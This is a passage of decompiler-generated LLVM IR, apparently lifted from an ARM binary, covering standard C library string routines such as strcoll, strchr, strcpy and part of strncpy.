  br i1 %v5_1169c53, label %dec_label_pc_11690.dec_label_pc_116c8.loopexit_crit_edge, label %dec_label_pc_116a0

dec_label_pc_116a0:                               ; preds = %dec_label_pc_11690.preheader, %dec_label_pc_11688.dec_label_pc_11690_crit_edge
  %v6_1169055 = phi i32 [ %v6_11690, %dec_label_pc_11688.dec_label_pc_11690_crit_edge ], [ %v6_1169050, %dec_label_pc_11690.preheader ]
  %v0_1169054 = phi i32 [ %v12_116bc, %dec_label_pc_11688.dec_label_pc_11690_crit_edge ], [ %v0_1169028, %dec_label_pc_11690.preheader ]
  %v1_116a0 = inttoptr i32 %v6_1169055 to i32*
  %v2_116a0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_116a0, i32* %v1_116a0, align 4
  %v3_116a0 = add i32 %v0_1169054, 12
  %v4_116a0 = inttoptr i32 %v3_116a0 to i32*
  %v5_116a0 = load i32, i32* @ip, align 4
  store i32 %v5_116a0, i32* %v4_116a0, align 4
  %v6_116a0 = add i32 %v0_1169054, 16
  store i32 %v6_116a0, i32* %r3.global-to-local, align 4
  %v0_116a4 = load i32, i32* %r2.global-to-local, align 4
  %v1_116a4 = add i32 %v0_116a4, -8
  store i32 %v1_116a4, i32* %r2.global-to-local, align 4
  %v5_116ac = icmp slt i32 %v1_116a4, 8
  br i1 %v5_116ac, label %dec_label_pc_116a0.dec_label_pc_116c8.loopexit_crit_edge, label %dec_label_pc_116b0

dec_label_pc_116b0:                               ; preds = %dec_label_pc_116a0
  %v1_116b0 = inttoptr i32 %v6_116a0 to i32*
  %v2_116b0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v2_116b0, i32* %v1_116b0, align 4
  %v3_116b0 = add i32 %v0_1169054, 20
  %v4_116b0 = inttoptr i32 %v3_116b0 to i32*
  %v5_116b0 = load i32, i32* @ip, align 4
  store i32 %v5_116b0, i32* %v4_116b0, align 4
  %v6_116b0 = add i32 %v0_1169054, 24
  store i32 %v6_116b0, i32* %r3.global-to-local, align 4
  %v0_116b4 = load i32, i32* %r2.global-to-local, align 4
  %v1_116b4 = add i32 %v0_116b4, -8
  store i32 %v1_116b4, i32* %r2.global-to-local, align 4
  %v5_116bc = icmp slt i32 %v1_116b4, 8
  br i1 %v5_116bc, label %dec_label_pc_116b0.dec_label_pc_116c8.loopexit_crit_edge, label %dec_label_pc_11688

dec_label_pc_11688:                               ; preds = %dec_label_pc_116b0
  %v7_116bc = inttoptr i32 %v6_116b0 to i32*
  %v8_116bc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_116bc, i32* %v7_116bc, align 4
  %v9_116bc = add i32 %v0_1169054, 28
  %v10_116bc = inttoptr i32 %v9_116bc to i32*
  %v11_116bc = load i32, i32* @ip, align 4
  store i32 %v11_116bc, i32* %v10_116bc, align 4
  %v12_116bc = add i32 %v0_1169054, 32
  store i32 %v12_116bc, i32* %r3.global-to-local, align 4
  %v6_116c0 = load i32, i32* %r2.global-to-local, align 4
  %v7_116c0 = add i32 %v6_116c0, -8
  store i32 %v7_116c0, i32* %r2.global-to-local, align 4
  %v5_1168c = icmp slt i32 %v7_116c0, 8
  br i1 %v5_1168c, label %dec_label_pc_11688.dec_label_pc_116c8.loopexit_crit_edge, label %dec_label_pc_11688.dec_label_pc_11690_crit_edge

dec_label_pc_11688.dec_label_pc_11690_crit_edge:  ; preds = %dec_label_pc_11688
  %v2_11690.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11690 = inttoptr i32 %v12_116bc to i32*
  store i32 %v2_11690.pre, i32* %v1_11690, align 4
  %v3_11690 = add i32 %v0_1169054, 36
  %v4_11690 = inttoptr i32 %v3_11690 to i32*
  %v5_11690 = load i32, i32* @ip, align 4
  store i32 %v5_11690, i32* %v4_11690, align 4
  %v6_11690 = add i32 %v0_1169054, 40
  store i32 %v6_11690, i32* %r3.global-to-local, align 4
  %v0_11694 = load i32, i32* %r2.global-to-local, align 4
  %v1_11694 = add i32 %v0_11694, -8
  store i32 %v1_11694, i32* %r2.global-to-local, align 4
  %v5_1169c = icmp slt i32 %v1_11694, 8
  br i1 %v5_1169c, label %dec_label_pc_11690.dec_label_pc_116c8.loopexit_crit_edge, label %dec_label_pc_116a0

dec_label_pc_11690.dec_label_pc_116c8.loopexit_crit_edge: ; preds = %dec_label_pc_11688.dec_label_pc_11690_crit_edge, %dec_label_pc_11690.preheader
  %v1_11694.lcssa = phi i32 [ %v1_1169452, %dec_label_pc_11690.preheader ], [ %v1_11694, %dec_label_pc_11688.dec_label_pc_11690_crit_edge ]
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116c8

dec_label_pc_11688.dec_label_pc_116c8.loopexit_crit_edge: ; preds = %dec_label_pc_11688
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116c8

dec_label_pc_116a0.dec_label_pc_116c8.loopexit_crit_edge: ; preds = %dec_label_pc_116a0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116c8

dec_label_pc_116b0.dec_label_pc_116c8.loopexit_crit_edge: ; preds = %dec_label_pc_116b0
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_116c8

dec_label_pc_116c8:                               ; preds = %dec_label_pc_11684, %dec_label_pc_11690.dec_label_pc_116c8.loopexit_crit_edge, %dec_label_pc_11688.dec_label_pc_116c8.loopexit_crit_edge, %dec_label_pc_116a0.dec_label_pc_116c8.loopexit_crit_edge, %dec_label_pc_116b0.dec_label_pc_116c8.loopexit_crit_edge, %entry
  %v0_116d0 = phi i32 [ %v0_11664, %entry ], [ %v1_116b4, %dec_label_pc_116b0.dec_label_pc_116c8.loopexit_crit_edge ], [ %v1_116a4, %dec_label_pc_116a0.dec_label_pc_116c8.loopexit_crit_edge ], [ %v7_116c0, %dec_label_pc_11688.dec_label_pc_116c8.loopexit_crit_edge ], [ %v1_11694.lcssa, %dec_label_pc_11690.dec_label_pc_116c8.loopexit_crit_edge ], [ %v0_11688.pr, %dec_label_pc_11684 ]
  %v2_116c8 = icmp eq i32 %v0_116d0, 0
  store i1 %v2_116c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_116c8, label %bb32, label %bb33

bb32:                                             ; preds = %dec_label_pc_116c8
  ret i32 %tmp

bb33:                                             ; preds = %dec_label_pc_116c8
  %v1_116d0 = sub i32 7, %v0_116d0
  store i32 %v1_116d0, i32* %r2.global-to-local, align 4
  %v3_116d4 = mul i32 %v1_116d0, 4
  %v4_116d4 = add i32 %v3_116d4, ptrtoint (i32* @global_var_116dc.407 to i32)
  call void @__pseudo_branch(i32 %v4_116d4)
  %v0_116dc = load i32, i32* %r1.global-to-local, align 4
  %v1_116dc = trunc i32 %v0_116dc to i8
  %v2_116dc = load i32, i32* %r3.global-to-local, align 4
  %v3_116dc = inttoptr i32 %v2_116dc to i8*
  store i8 %v1_116dc, i8* %v3_116dc, align 1
  %v4_116dc = load i32, i32* %r3.global-to-local, align 4
  %v5_116dc = add i32 %v4_116dc, 1
  store i32 %v5_116dc, i32* %r3.global-to-local, align 4
  %v0_116e0 = load i32, i32* %r1.global-to-local, align 4
  %v1_116e0 = trunc i32 %v0_116e0 to i8
  %v3_116e0 = inttoptr i32 %v5_116dc to i8*
  store i8 %v1_116e0, i8* %v3_116e0, align 1
  %v4_116e0 = load i32, i32* %r3.global-to-local, align 4
  %v5_116e0 = add i32 %v4_116e0, 1
  store i32 %v5_116e0, i32* %r3.global-to-local, align 4
  %v0_116e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_116e4 = trunc i32 %v0_116e4 to i8
  %v3_116e4 = inttoptr i32 %v5_116e0 to i8*
  store i8 %v1_116e4, i8* %v3_116e4, align 1
  %v4_116e4 = load i32, i32* %r3.global-to-local, align 4
  %v5_116e4 = add i32 %v4_116e4, 1
  store i32 %v5_116e4, i32* %r3.global-to-local, align 4
  %v0_116e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_116e8 = trunc i32 %v0_116e8 to i8
  %v3_116e8 = inttoptr i32 %v5_116e4 to i8*
  store i8 %v1_116e8, i8* %v3_116e8, align 1
  %v4_116e8 = load i32, i32* %r3.global-to-local, align 4
  %v5_116e8 = add i32 %v4_116e8, 1
  store i32 %v5_116e8, i32* %r3.global-to-local, align 4
  %v0_116ec = load i32, i32* %r1.global-to-local, align 4
  %v1_116ec = trunc i32 %v0_116ec to i8
  %v3_116ec = inttoptr i32 %v5_116e8 to i8*
  store i8 %v1_116ec, i8* %v3_116ec, align 1
  %v4_116ec = load i32, i32* %r3.global-to-local, align 4
  %v5_116ec = add i32 %v4_116ec, 1
  store i32 %v5_116ec, i32* %r3.global-to-local, align 4
  %v0_116f0 = load i32, i32* %r1.global-to-local, align 4
  %v1_116f0 = trunc i32 %v0_116f0 to i8
  %v3_116f0 = inttoptr i32 %v5_116ec to i8*
  store i8 %v1_116f0, i8* %v3_116f0, align 1
  %v4_116f0 = load i32, i32* %r3.global-to-local, align 4
  %v5_116f0 = add i32 %v4_116f0, 1
  store i32 %v5_116f0, i32* %r3.global-to-local, align 4
  %v0_116f4 = load i32, i32* %r1.global-to-local, align 4
  %v1_116f4 = trunc i32 %v0_116f4 to i8
  %v3_116f4 = inttoptr i32 %v5_116f0 to i8*
  store i8 %v1_116f4, i8* %v3_116f4, align 1
  %v4_116f4 = load i32, i32* %r3.global-to-local, align 4
  %v5_116f4 = add i32 %v4_116f4, 1
  store i32 %v5_116f4, i32* %r3.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v6_11690, { 1, 0 }
  uselistorder i32 %v12_116bc, { 1, 2, 0 }
  uselistorder i32 %v0_1169054, { 0, 1, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_11688.pr, { 0, 2, 1 }
  uselistorder i32 %v6_11678, { 2, 3, 0, 4, 1 }
  uselistorder i32 %v5_1166c, { 1, 0 }
  uselistorder i32 %v0_11664, { 1, 0, 2, 3 }
  uselistorder i32 %tmp, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 19, 20, 17, 14, 15, 16, 13, 18, 21, 22 }
  uselistorder i32* %r2.global-to-local, { 1, 9, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 8, 10, 11, 12, 13, 7, 14, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 3, 2, 4, 1, 0, 8, 7, 5, 9 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_116c8, { 4, 3, 2, 1, 0, 5 }
  uselistorder label %dec_label_pc_116a0, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2) local_unnamed_addr {
bb:
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_11704.pre = load i32, i32* @r1, align 4
  br label %entry

entry:                                            ; preds = %bb3, %bb
  %v0_11704 = phi i32 [ %v0_11704.pre, %bb ], [ %v5_11704, %bb3 ]
  %v0_11700 = phi i32 [ %tmp, %bb ], [ %v5_11700, %bb3 ]
  %v1_11700 = inttoptr i32 %v0_11700 to i8*
  %v2_11700 = load i8, i8* %v1_11700, align 1
  %v1_11704 = inttoptr i32 %v0_11704 to i8*
  %v2_11704 = load i8, i8* %v1_11704, align 1
  %v3_11704 = zext i8 %v2_11704 to i32
  %v2_11708 = icmp eq i8 %v2_11700, 0
  br i1 %v2_11708, label %.dec_label_pc_11714_crit_edge, label %bb3

bb3:                                              ; preds = %entry
  %v5_11704 = add i32 %v0_11704, 1
  %v5_11700 = add i32 %v0_11700, 1
  %v3_11700 = zext i8 %v2_11700 to i32
  %v10_1170c = icmp eq i8 %v2_11700, %v2_11704
  br i1 %v10_1170c, label %entry, label %dec_label_pc_11714

.dec_label_pc_11714_crit_edge:                    ; preds = %entry
  br label %dec_label_pc_11714

dec_label_pc_11714:                               ; preds = %bb3, %.dec_label_pc_11714_crit_edge
  %.pn = phi i32 [ 0, %.dec_label_pc_11714_crit_edge ], [ %v3_11700, %bb3 ]
  %v2_11714.pre-phi = sub nsw i32 %.pn, %v3_11704
  ret i32 %v2_11714.pre-phi

; uselistorder directives
  uselistorder i8 %v2_11700, { 0, 2, 1 }
  uselistorder i32 %v0_11700, { 1, 0 }
  uselistorder i32 %v0_11704, { 1, 0 }
  uselistorder label %dec_label_pc_11714, { 1, 0 }
}

declare i32 @strlen(i8*) local_unnamed_addr

define i32 @__GI_strchr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v6_11780 = load i32, i32* @r5, align 4
  %v9_11780 = load i32, i32* @r6, align 4
  %v1_11784 = urem i32 %arg1, 256
  br label %dec_label_pc_117a4

dec_label_pc_1178c:                               ; preds = %dec_label_pc_117a4
  %v3_1178c = load i8, i8* %.0, align 1
  %v4_1178c = zext i8 %v3_1178c to i32
  %v9_11790 = icmp eq i32 %v4_1178c, %v1_11784
  br i1 %v9_11790, label %bb, label %bb24

bb:                                               ; preds = %dec_label_pc_1178c
  ret i32 %v1_117a4

bb24:                                             ; preds = %dec_label_pc_1178c
  %v2_11798 = icmp eq i8 %v3_1178c, 0
  %v2_1179c = add i32 %v1_117a4, 1
  %v3_1179c = inttoptr i32 %v2_1179c to i8*
  br i1 %v2_11798, label %dec_label_pc_11878, label %dec_label_pc_117a4

dec_label_pc_117a4:                               ; preds = %bb24, %entry
  %.0 = phi i8* [ undef, %entry ], [ %v3_1179c, %bb24 ]
  %v1_117a4 = ptrtoint i8* %.0 to i32
  %v2_117a4 = urem i32 %v1_117a4, 4
  %v3_117a4 = icmp eq i32 %v2_117a4, 0
  br i1 %v3_117a4, label %dec_label_pc_117ac, label %dec_label_pc_1178c

dec_label_pc_117ac:                               ; preds = %dec_label_pc_117a4
  %v4_117ac = mul nuw nsw i32 %v1_11784, 256
  %v5_117ac = or i32 %v4_117ac, %v1_11784
  %v4_117b4 = mul i32 %v5_117ac, 65536
  %v5_117b4 = or i32 %v4_117b4, %v5_117ac
  br label %dec_label_pc_117b8

dec_label_pc_117b8:                               ; preds = %dec_label_pc_11870, %dec_label_pc_117f8, %dec_label_pc_117ac
  %v0_1181c = phi i32 [ %v1_117a4, %dec_label_pc_117ac ], [ %v4_117b8, %dec_label_pc_117f8 ], [ %v4_117b8, %dec_label_pc_11870 ]
  %v1_117b8 = inttoptr i32 %v0_1181c to i32*
  %v2_117b8 = load i32, i32* %v1_117b8, align 4
  %v4_117b8 = add i32 %v0_1181c, 4
  %v2_117c0 = xor i32 %v2_117b8, %v5_117b4
  %v2_117cc = add i32 %v2_117b8, 2130640639
  %v1_117d0 = sub i32 -1, %v2_117b8
  %v2_117d4 = xor i32 %v2_117cc, %v1_117d0
  %v2_117d8 = add i32 %v2_117c0, 2130640639
  %v1_117e0 = sub i32 -1, %v2_117c0
  %v2_117e4 = and i32 %v2_117d4, -2130640640
  %v2_117e8 = xor i32 %v2_117d8, %v1_117e0
  %v2_117ec = icmp eq i32 %v2_117e4, 0
  %v2_117f0 = and i32 %v2_117e8, -2130640640
  store i32 %v2_117f0, i32* @lr, align 4
  br i1 %v2_117ec, label %dec_label_pc_117f8, label %dec_label_pc_11800

dec_label_pc_117f8:                               ; preds = %dec_label_pc_117b8
  %v2_117f8 = icmp eq i32 %v2_117f0, 0
  br i1 %v2_117f8, label %dec_label_pc_117b8, label %dec_label_pc_11800

dec_label_pc_11800:                               ; preds = %dec_label_pc_117b8, %dec_label_pc_117f8
  %v2_11800 = inttoptr i32 %v0_1181c to i8*
  %v3_11800 = load i8, i8* %v2_11800, align 1
  %v4_11800 = zext i8 %v3_11800 to i32
  %v1_11808 = add i32 %v0_1181c, 1
  %v1_1180c = add i32 %v0_1181c, 2
  %v9_11810 = icmp eq i32 %v4_11800, %v1_11784
  %v1_11814 = add i32 %v0_1181c, 3
  store i32 %v1_11814, i32* @ip, align 4
  br i1 %v9_11810, label %dec_label_pc_1181c, label %dec_label_pc_11824

dec_label_pc_1181c:                               ; preds = %dec_label_pc_11800
  store i32 %v6_11780, i32* @r5, align 4
  store i32 %v9_11780, i32* @r6, align 4
  ret i32 %v0_1181c

dec_label_pc_11824:                               ; preds = %dec_label_pc_11800
  %v2_11824 = icmp eq i8 %v3_11800, 0
  br i1 %v2_11824, label %dec_label_pc_11878, label %dec_label_pc_1182c

dec_label_pc_1182c:                               ; preds = %dec_label_pc_11824
  %v2_1182c = inttoptr i32 %v1_11808 to i8*
  %v3_1182c = load i8, i8* %v2_1182c, align 1
  %v4_1182c = zext i8 %v3_1182c to i32
  %v9_11830 = icmp eq i32 %v4_1182c, %v1_11784
  br i1 %v9_11830, label %bb25, label %bb26

bb25:                                             ; preds = %dec_label_pc_1182c
  store i32 %v6_11780, i32* @r5, align 4
  store i32 %v9_11780, i32* @r6, align 4
  ret i32 %v1_11808

bb26:                                             ; preds = %dec_label_pc_1182c
  %v2_11838 = icmp eq i8 %v3_1182c, 0
  br i1 %v2_11838, label %dec_label_pc_11878, label %dec_label_pc_11840

dec_label_pc_11840:                               ; preds = %bb26
  %v2_11840 = inttoptr i32 %v1_1180c to i8*
  %v3_11840 = load i8, i8* %v2_11840, align 1
  %v4_11840 = zext i8 %v3_11840 to i32
  %v9_11844 = icmp eq i32 %v4_11840, %v1_11784
  br i1 %v9_11844, label %dec_label_pc_1184c, label %dec_label_pc_11854

dec_label_pc_1184c:                               ; preds = %dec_label_pc_11840
  store i32 %v6_11780, i32* @r5, align 4
  store i32 %v9_11780, i32* @r6, align 4
  ret i32 %v1_1180c

dec_label_pc_11854:                               ; preds = %dec_label_pc_11840
  %v2_11854 = icmp eq i8 %v3_11840, 0
  br i1 %v2_11854, label %dec_label_pc_11878, label %dec_label_pc_1185c

dec_label_pc_1185c:                               ; preds = %dec_label_pc_11854
  %v2_1185c = inttoptr i32 %v1_11814 to i8*
  %v3_1185c = load i8, i8* %v2_1185c, align 1
  %v4_1185c = zext i8 %v3_1185c to i32
  %v9_11860 = icmp eq i32 %v4_1185c, %v1_11784
  br i1 %v9_11860, label %dec_label_pc_11868, label %dec_label_pc_11870

dec_label_pc_11868:                               ; preds = %dec_label_pc_1185c
  store i32 %v6_11780, i32* @r5, align 4
  store i32 %v9_11780, i32* @r6, align 4
  ret i32 %v1_11814

dec_label_pc_11870:                               ; preds = %dec_label_pc_1185c
  %v2_11870 = icmp eq i8 %v3_1185c, 0
  br i1 %v2_11870, label %dec_label_pc_11878, label %dec_label_pc_117b8

dec_label_pc_11878:                               ; preds = %bb24, %dec_label_pc_11870, %dec_label_pc_11854, %bb26, %dec_label_pc_11824
  store i32 %v6_11780, i32* @r5, align 4
  store i32 %v9_11780, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_117b8, { 1, 0 }
  uselistorder i32 %v2_117b8, { 0, 2, 1 }
  uselistorder i32 %v0_1181c, { 0, 1, 2, 3, 4, 6, 5 }
  uselistorder i32 %v5_117ac, { 1, 0 }
  uselistorder i32 %v1_117a4, { 1, 0, 2, 3 }
  uselistorder i8* %.0, { 1, 0 }
  uselistorder i32 %v1_11784, { 2, 3, 4, 5, 6, 0, 1 }
  uselistorder i32 %v9_11780, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v6_11780, { 3, 0, 1, 2, 4 }
  uselistorder label %dec_label_pc_11878, { 1, 2, 3, 4, 0 }
  uselistorder label %dec_label_pc_11800, { 1, 0 }
}

define i32 @strcpy(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_11888 = sub i32 %arg1, %tmp
  %v1_1188c = add i32 %v2_11888, -1
  store i32 %v1_1188c, i32* %r2.global-to-local, align 4
  %v2_118904 = load i8, i8* %arg2, align 1
  %v5_118906 = add i32 %tmp, 1
  store i32 %v5_118906, i32* %r1.global-to-local, align 4
  %v2_118947 = icmp eq i8 %v2_118904, 0
  store i1 %v2_118947, i1* %cpsr_z.global-to-local, align 1
  %v5_118988 = inttoptr i32 %arg1 to i8*
  store i8 %v2_118904, i8* %v5_118988, align 1
  %v0_1189c9 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1189c9, label %dec_label_pc_118a0, label %dec_label_pc_11890.dec_label_pc_11890_crit_edge

dec_label_pc_11890.dec_label_pc_11890_crit_edge:  ; preds = %entry, %dec_label_pc_11890.dec_label_pc_11890_crit_edge
  %v0_11890.pre = load i32, i32* %r1.global-to-local, align 4
  %v3_11898.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_11890 = inttoptr i32 %v0_11890.pre to i8*
  %v2_11890 = load i8, i8* %v1_11890, align 1
  %v5_11890 = add i32 %v0_11890.pre, 1
  store i32 %v5_11890, i32* %r1.global-to-local, align 4
  %v2_11894 = icmp eq i8 %v2_11890, 0
  store i1 %v2_11894, i1* %cpsr_z.global-to-local, align 1
  %v4_11898 = add i32 %v5_11890, %v3_11898.pre
  %v5_11898 = inttoptr i32 %v4_11898 to i8*
  store i8 %v2_11890, i8* %v5_11898, align 1
  %v0_1189c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_1189c, label %dec_label_pc_118a0, label %dec_label_pc_11890.dec_label_pc_11890_crit_edge

dec_label_pc_118a0:                               ; preds = %dec_label_pc_11890.dec_label_pc_11890_crit_edge, %entry
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 0 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11890.dec_label_pc_11890_crit_edge, { 1, 0 }
}

define i32 @strncpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v7_118a4 = icmp eq i32 %arg2, 3
  store i1 %v7_118a4, i1* %cpsr_z.global-to-local, align 1
  %v1_118ac = add i32 %arg1, -1
  store i32 %v1_118ac, i32* @ip, align 4
  %tmp = icmp ult i32 %arg2, 4
  br i1 %tmp, label %dec_label_pc_11928, label %dec_label_pc_118b4

dec_label_pc_118b4:                               ; preds = %entry
  %v3_118b4 = udiv i32 %arg2, 4
  store i32 %v3_118b4, i32* @lr, align 4
  %v0_118b8.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_118b8

dec_label_pc_118b8:                               ; preds = %dec_label_pc_11904, %dec_label_pc_118b4
  %v2_118c0 = phi i32 [ %v6_118f8, %dec_label_pc_11904 ], [ %v1_118ac, %dec_label_pc_118b4 ]
  %v0_118b8 = phi i32 [ %v1_11908, %dec_label_pc_11904 ], [ %v0_118b8.pre, %dec_label_pc_118b4 ]
  %v1_118b8 = inttoptr i32 %v0_118b8 to i8*
  %v2_118b8 = load i8, i8* %v1_118b8, align 1
  %v3_118b8 = zext i8 %v2_118b8 to i32
  store i32 %v3_118b8, i32* %r3.global-to-local, align 4
  %v2_118bc = icmp eq i8 %v2_118b8, 0
  store i1 %v2_118bc, i1* %cpsr_z.global-to-local, align 1
  %v3_118c0 = add i32 %v2_118c0, 1
  %v4_118c0 = inttoptr i32 %v3_118c0 to i8*
  store i8 %v2_118b8, i8* %v4_118c0, align 1
  %v5_118c0 = load i32, i32* @ip, align 4
  %v6_118c0 = add i32 %v5_118c0, 1
  store i32 %v6_118c0, i32* @ip, align 4
  %v0_118c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_118c4, label %dec_label_pc_11914, label %dec_label_pc_118c8

dec_label_pc_118c8:                               ; preds = %dec_label_pc_118b8
  %v0_118c8 = load i32, i32* @r1, align 4
  %v1_118c8 = add i32 %v0_118c8, 1
  %v2_118c8 = inttoptr i32 %v1_118c8 to i8*
  %v3_118c8 = load i8, i8* %v2_118c8, align 1
  %v4_118c8 = zext i8 %v3_118c8 to i32
  store i32 %v4_118c8, i32* %r3.global-to-local, align 4
  %v2_118cc = icmp eq i8 %v3_118c8, 0
  store i1 %v2_118cc, i1* %cpsr_z.global-to-local, align 1
  %v3_118d0 = add i32 %v5_118c0, 2
  %v4_118d0 = inttoptr i32 %v3_118d0 to i8*
  store i8 %v3_118c8, i8* %v4_118d0, align 1
  %v5_118d0 = load i32, i32* @ip, align 4
  %v6_118d0 = add i32 %v5_118d0, 1
  store i32 %v6_118d0, i32* @ip, align 4
  %v0_118d4 = load i32, i32* @r1, align 4
  %v1_118d4 = add i32 %v0_118d4, 1
  store i32 %v1_118d4, i32* %r1.global-to-local, align 4
  %v0_118d8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_118d8, label %dec_label_pc_11914, label %dec_label_pc_118dc

dec_label_pc_118dc:                               ; preds = %dec_label_pc_118c8
  %v1_118dc = add i32 %v0_118d4, 2
  %v2_118dc = inttoptr i32 %v1_118dc to i8*
  %v3_118dc = load i8, i8* %v2_118dc, align 1
  %v4_118dc = zext i8 %v3_118dc to i32
  store i32 %v4_118dc, i32* %r3.global-to-local, align 4
  %v2_118e0 = icmp eq i8 %v3_118dc, 0
  store i1 %v2_118e0, i1* %cpsr_z.global-to-local, align 1
  %v3_118e4 = add i32 %v5_118d0, 2
  %v4_118e4 = inttoptr i32 %v3_118e4 to i8*
  store i8 %v3_118dc, i8* %v4_118e4, align 1
  %v5_118e4 = load i32, i32* @ip, align 4
  %v6_118e4 = add i32 %v5_118e4, 1
  store i32 %v6_118e4, i32* @ip, align 4
  %v0_118e8 = load i32, i32* %r1.global-to-local, align 4
  %v1_118e8 = add i32 %v0_118e8, 1
  store i32 %v1_118e8, i32* %r1.global-to-local, align 4
  %v0_118ec = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_118ec, label %dec_label_pc_11914, label %dec_label_pc_118f0

dec_label_pc_118f0:                               ; preds = %dec_label_pc_118dc
  %v1_118f0 = add i32 %v0_118e8, 2
  %v2_118f0 = inttoptr i32 %v1_118f0 to i8*
  %v3_118f0 = load i8, i8* %v2_118f0, align 1
  %v4_118f0 = zext i8 %v3_118f0 to i32
  store i32 %v4_118f0, i32* %r3.global-to-local, align 4
  %v2_118f4 = icmp eq i8 %v3_118f0, 0
  store i1 %v2_118f4, i1* %cpsr_z.global-to-local, align 1
  %v3_118f8 = add i32 %v5_118e4, 2
  %v4_118f8 = inttoptr i32 %v3_118f8 to i8*
  store i8 %v3_118f0, i8* %v4_118f8, align 1
  %v5_118f8 = load i32, i32* @ip, align 4
  %v6_118f8 = add i32 %v5_118f8, 1
  store i32 %v6_118f8, i32* @ip, align 4
  %v0_118fc = load i32, i32* %r1.global-to-local, align 4
  %v1_118fc = add i32 %v0_118fc, 1
  store i32 %v1_118fc, i32* %r1.global-to-local, align 4
  %v0_11900 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_11900, label %dec_label_pc_11914, label %dec_label_pc_11904

dec_label_pc_11904:                               ; preds = %dec_label_pc_118f0
  %v0_11904 = load i32, i32* @lr, align 4
  %v1_11904 = add i32 %v0_11904, -1
  store i32 %v1_11904, i32* @lr, align 4
  %v7_11904 = icmp eq i32 %v0_11904, 1
  store i1 %v7_11904, i1* %cpsr_z.global-to-local, align 1
  %v1_11908 = add i32 %v0_118fc, 2
  store i32 %v1_11908, i32* @r1, align 4
  br i1 %v7_11904, label %dec_label_pc_11928, label %dec_label_pc_118b8

dec_label_pc_11914:                               ; preds = %dec_label_pc_118f0, %dec_label_pc_118dc, %dec_label_pc_118c8, %dec_label_pc_118b8
  %v1_11914 = phi i32 [ %v6_118f8, %dec_label_pc_118f0 ], [ %v6_118e4, %dec_label_pc_118dc ], [ %v6_118d0, %dec_label_pc_118c8 ], [ %v6_118c0, %dec_label_pc_118b8 ]
  %v2_119141 = sub i32 %arg1, %v1_11914
  %v2_11918 = add i32 %v2_119141, %arg2
  store i32 %v2_11918, i32* %r3.global-to-local, align 4
  %v1_1191c = add i32 %v2_11918, -1
  store i32 %v1_1191c, i32* %r2.global-to-local, align 4
  %v7_1191c = icmp eq i32 %v2_11918, 1
  store i1 %v7_1191c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1191c, label %bb, label %dec_label_pc_11948

bb:                                               ; preds = %dec_label_pc_11914
  ret i32 %arg1

dec_label_pc_11928:                               ; preds = %dec_label_pc_11904, %entry
  %v2_119386 = phi i32 [ %v1_118ac, %entry ], [ %v6_118f8, %dec_label_pc_11904 ]
  %v1_11928 = urem i32 %arg2, 4
  store i32 %v1_11928, i32* %r2.global-to-local, align 4
  %v2_11928 = icmp eq i32 %v1_11928, 0
  store i1 %v2_11928, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_11928, label %bb11, label %.preheader

bb11:                                             ; preds = %dec_label_pc_11928
  ret i32 %arg1

.preheader:                                       ; preds = %dec_label_pc_11928, %._crit_edge
  %v2_11938 = phi i32 [ %v6_11938, %._crit_edge ], [ %v2_119386, %dec_label_pc_11928 ]
  %v0_11934 = phi i32 [ %v0_11934.pre, %._crit_edge ], [ %v1_11928, %dec_label_pc_11928 ]
  %v0_11930 = load i32, i32* @r1, align 4
  %v1_11930 = inttoptr i32 %v0_11930 to i8*
  %v2_11930 = load i8, i8* %v1_11930, align 1
  %v3_11930 = zext i8 %v2_11930 to i32
  store i32 %v3_11930, i32* %r3.global-to-local, align 4
  %v5_11930 = add i32 %v0_11930, 1
